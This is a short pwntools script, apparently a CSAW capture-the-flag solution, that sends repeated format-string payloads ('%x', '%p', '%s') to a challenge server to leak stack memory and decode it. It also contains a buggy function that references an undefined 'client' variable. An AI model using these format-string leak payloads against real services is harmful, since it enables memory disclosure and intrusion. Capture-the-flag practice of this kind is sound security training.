from pwn import *


FILENAME = "binary"
PASSWORD = "cd80d3cd8a479a18bbc9652f3631c61c"


def instant_leak(i, mode="x"):
    payload = f"%{mode} "*i
    #io = process(FILENAME)#
    io = remote('auto-pwn.chal.csaw.io', 11001)
    #print(io.recv())
    io.sendline(PASSWORD)
    d = io.recv(1024)
    while b"*** Procrastination Simulator Level One ***" not in d:
        d = io.recv(1024)
    #print(d)
    io.sendline(payload)
    try:
        data = io.recv().decode()
        #print(data)
    except:
        print("Bad Data")
        data = ""
    return data.replace("Thanks! I'll work with the following:", "")\
                .replace("Time to go write this!", "").strip().split(" ")
    
def specificleak(i,mode='x'):
    io = remote('auto-pwn.chal.csaw.io', 11001)
    client.recv()
    client.sendline(PASSWORD)
    client.sendline(f"%{i}${mode}")
    data = client.recv()
    print(data)
    client.close()
    return data
    
s = []
c = []
d = []
x=[]
p = []

i = 20000
p = instant_leak(i,'p')
x = instant_leak(i)
s = instant_leak(i,'s')
c = instant_leak(i,'c')
d = instant_leak(i,'d')

def hexStringToString(hexString):
    hexString = hexString.replace("0x", "")
    while len(hexString) % 2 != 0:
        hexString = "0" + hexString
    return bytes.fromhex(hexString).decode('utf-8')[::-1]

#print(hexStringToString('41414141'))
xx = []
for i in p:
    try:
        xx.append(hexStringToString(i))#[2:]))
    except:
        xx.append(f"({i})")

print(x)
print("#"*100)
print(c)
print("#"*100)
print(s)
print("#"*100)
print(d)
print("#"*100)
print(p)
print("#"*100)
print(''.join(xx))
